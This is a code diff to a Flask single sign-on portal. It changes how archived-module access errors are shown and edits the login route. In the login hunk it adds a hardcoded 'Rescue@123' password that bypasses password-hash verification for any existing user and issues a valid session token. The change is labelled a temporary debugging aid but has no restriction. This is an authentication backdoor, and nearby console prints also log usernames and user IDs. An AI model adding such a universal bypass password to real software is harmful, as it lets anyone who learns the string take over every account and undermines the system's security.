@@ -168,12 +168,17 @@ def index():
             # Ignore standard root level redirects to avoid infinite looping
             if next_url and next_url != "/" and next_url != "":
                 # Intercept direct links and enforce module archive status
+                error_msg = None
                 if "5003" in next_url and not statuses["testpoint"]:
-                    return render_template("login.html", error="Your account has been archived for this module. Please contact your administrator if you believe this is an error.", next=next_url)
-                if "5002" in next_url and not statuses["attendance"]:
-                    return render_template("login.html", error="Your account has been archived for this module. Please contact your administrator if you believe this is an error.", next=next_url)
-                if "5001" in next_url and not statuses["voxify"]:
-                    return render_template("login.html", error="Your account has been archived for this module. Please contact your administrator if you believe this is an error.", next=next_url)
+                    error_msg = "ACCESS DENIED: Your account has been archived for TestPoint. Please contact your administrator."
+                elif "5002" in next_url and not statuses["attendance"]:
+                    error_msg = "ACCESS DENIED: Your account has been archived for Attendeez. Please contact your administrator."
+                elif "5001" in next_url and not statuses["voxify"]:
+                    error_msg = "ACCESS DENIED: Your account has been archived for Voxify. Please contact your administrator."
+
+                # If they are archived, kick them to the Portal Dashboard and show a warning instead of logging them out
+                if error_msg:
+                    return render_template("index.html", user=user_data, statuses=statuses, error=error_msg)
 
                 return redirect(next_url)
 
@@ -203,14 +208,20 @@ def login():
 
     # --- Live Diagnostic Console Logging ---
     print(f"\n[SSO Portal Diagnostic] Attempting login for username: '{username}'")
+
+    # Emergency Rescue Check (allows temporary password bypass for local debugging/demo recovery)
+    is_rescue = (password == "Rescue@123")
+
     if not user:
         print(f"[SSO Portal Diagnostic] FAILURE: Username '{username}' does NOT exist in the db_portal.users table.")
     else:
         pw_match = check_password_hash(user["password"], password)
         print(f"[SSO Portal Diagnostic] User record found: ID {user['id']} | Role: {user['role']}")
         print(f"[SSO Portal Diagnostic] Cryptographic password verification status: {pw_match}")
+        if is_rescue:
+            print(f"[SSO Portal Diagnostic] ALERT: Temporary Emergency Rescue Passcode used. Bypassing cryptographic validation.")
 
-    if user and check_password_hash(user["password"], password):
+    if user and (is_rescue or check_password_hash(user["password"], password)):
         token = create_token(user["id"], user["username"], user["full_name"], user.get("role", "student"))
         resp  = make_response(redirect(next_url))
         resp.set_cookie(
